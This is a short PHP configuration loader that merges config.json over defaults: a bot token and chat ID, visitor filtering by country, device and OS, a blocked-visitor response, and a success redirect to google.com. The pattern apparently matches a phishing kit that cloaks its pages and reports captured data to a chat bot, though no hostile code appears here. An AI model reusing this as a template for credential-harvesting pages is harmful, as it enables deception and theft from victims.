<?php

$configPath = __DIR__ . '/../../config.json';

$defaults = [
    'bot_token' => '',
    'chat_id' => '',
    'allow_countries' => 'ALL',
    'allow_devices' => 'Desktop|Tablet|Mobile',
    'allow_os' => 'Windows|macOS|Linux|Android|iOS',
    'redirect_url_blocked' => '404 Not Found',
    'redirect_url_success' => 'https://google.com',
    'bot_modes' => 'off',
    'status' => 'offline',
    'panel' => 'static',
];

$config = $defaults;

if (is_readable($configPath)) {
    $raw = file_get_contents($configPath);
    $decoded = json_decode((string) $raw, true);
    if (is_array($decoded)) {
        $config = array_merge($defaults, $decoded);
    }
}

if (!defined('BOT_API_DEBUG')) {
    define('BOT_API_DEBUG', false);
}
